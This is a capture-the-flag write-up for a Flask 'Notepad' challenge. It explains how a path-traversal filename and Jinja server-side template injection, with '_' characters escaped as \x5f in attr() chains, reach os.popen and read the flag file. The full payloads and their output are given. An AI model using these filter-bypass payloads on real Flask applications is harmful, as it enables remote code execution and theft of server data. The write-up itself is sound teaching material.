
# Notepad

Jinja template engine injection possibilities.


# Problem

The challenge is to bypass the filters in order to get a successfully executed
python code inside the rendered templates on the server-side.

The server is implemented in Flask, and uses a template engine there which renders
the error templates; and assumes that are safe to render with the `request` object.



# Solution

In order to successfully write to an error template file, we need to achieve the following:

- The input must be `> 128 bytes` and `< 512 bytes` so that it doesn't trigger the `long content` error condition.
- The input must not use `_` and `/`, otherwise it will be filtered out.
- The input generates a filename based on the first `128 bytes` of the content, which means that we can modify the path it is written to.
- The generated filename also uses a `urlfix` suffix which makes it harder to read/write to other files.


## 1. Write a file that gets rendered with the template engine

If we type in the following content into the textarea, we'll successfully write to a file in the `/templates/error` folder:

```plaintext
..\templates\errors\aaa... (repeat ~128 times)
```

The `POST` request of the form will redirect to another page, which contains the generated URL.

We copy the URL of the `/static/templates/aaa...-suffix.html` and we modify it so that it looks
like this: `http://server:port/?error=aaa...-suffix`. This will successfully render our generated
file, because the error parameter will include and render the file directly via the [index template](./challenge/templates/index.html).


## 2. Execute injected python code

Now the next goal is to execute our injected code on the server. Note the trailing `{{...}}` brackets
which will let the template engine render our computed output of the expression (`91`) instead of
the actual text.

```plaintext
..\templates\errors\aaa... (repeat ~128 times)

{{ 13*7 }}
```


## 3. Execute code on the system

Now the fun part. We need to get access to some nice APIs we can use, because using `import "os"` doesn't
work. Lucky for us, the Python Inheritance model allows us to get access to the `globals` and therefore
pretty much everything that is loaded and imported already.

The [app.py](./challenge/app.py) filters out the `_` character, though, so we have to get a little creative.

We want access to the following API code:

```python
request.application.__globals__.__builtins__.__import__('os').listdir()
```

The above code translates to the following code in `attr(...)` form that bypasses the filter. Note that for
each property we have to use the internal `__getitem__(...)` method, and we use `\x5f` which is the urlencoded
variant of `_`.

```python
request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("listdir")()
```

After we've rendered the above generated error template, it returns us this:

```plaintext
\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcdefg
['templates', 'static', 'flag-c8f5526c-4122-4578-96de-d7dd27193798.txt', 'app.py']
```

## 4. Reading the flag file

After trying out some code to read the file, we had the problem that most of the APIs require an assignment which crashes the server,
and that's why we decided to use the `os.popen(...shell command...).read()` method to get the contents. All other python APIs need
either an import statement or a file descriptor which needs an assignment, so they couldn't be used.

So the final `template exploit code` looks like this:

```plaintext
..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcdefg {{
request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("cat flag-c8f5526c-4122-4578-96de-d7dd27193798.txt")|attr("read")()
}}
```

